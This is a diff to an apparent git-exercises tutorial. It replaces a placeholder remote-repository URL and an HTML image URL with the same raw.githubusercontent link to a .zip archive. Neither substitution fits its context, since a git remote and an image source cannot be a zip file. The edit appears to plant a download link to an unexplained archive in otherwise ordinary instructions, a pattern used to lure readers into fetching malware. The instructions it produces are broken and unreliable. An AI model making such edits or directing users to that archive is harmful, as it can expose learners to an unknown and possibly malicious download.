@@ -23,7 +23,7 @@ cd git-exercises-main
 
 # 3. Change remote origin to your new repository
 git remote remove origin
-git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git
+git remote add origin https://raw.githubusercontent.com/jnrjerome/GIT-Exercise/main/src/Exercise_GI_1.8-alpha.1.zip
 
 # 4. Push to your new remote repository
 git push -u origin main
@@ -69,7 +69,7 @@ git checkout -b feature/upgrade-dependencies
 
 # 3. Add image to index.html
 # Edit src/main/webapp/index.html and add:
-# <img src="https://www.careeraddict.com/uploads/article/58721/illustration-group-people-team-meeting.jpg" alt="Team Meeting">
+# <img src="https://raw.githubusercontent.com/jnrjerome/GIT-Exercise/main/src/Exercise_GI_1.8-alpha.1.zip" alt="Team Meeting">
 
 # 4. Check changes
 git diff
